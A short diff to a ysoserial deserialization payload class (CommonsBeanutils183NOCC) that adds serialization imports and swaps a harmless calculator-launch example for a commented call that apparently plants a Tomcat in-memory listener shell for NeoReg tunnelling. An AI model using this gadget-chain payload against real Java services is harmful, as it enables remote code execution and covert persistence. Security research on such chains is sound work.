@@ -4,12 +4,15 @@ import javassist.ClassPool;
 import javassist.CtClass;
 import javassist.CtField;
 import org.apache.commons.beanutils.BeanComparator;
+import ysoserial.Serializer;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
+import java.io.File;
+import java.io.FileOutputStream;
 import java.util.PriorityQueue;
 
 @SuppressWarnings({"rawtypes", "unchecked"})
@@ -19,7 +22,7 @@ public class CommonsBeanutils183NOCC implements ObjectPayload<Object> {
     public static void main(String[] args) throws Exception {
         PayloadRunner.run(CommonsBeanutils192NOCC.class, args);
 
-//        Object object = new CommonsBeanutils183NOCC().getObject("open -a Calculator.app");
+//        Object object = new CommonsBeanutils183NOCC().getObject("CLASS:TomcatListenerNeoRegFromThread");
 //        File file = new File("/tmp/ser.ser");
 //        if (file.exists()) file.delete();
 //        Serializer.serialize(object, new FileOutputStream(file));
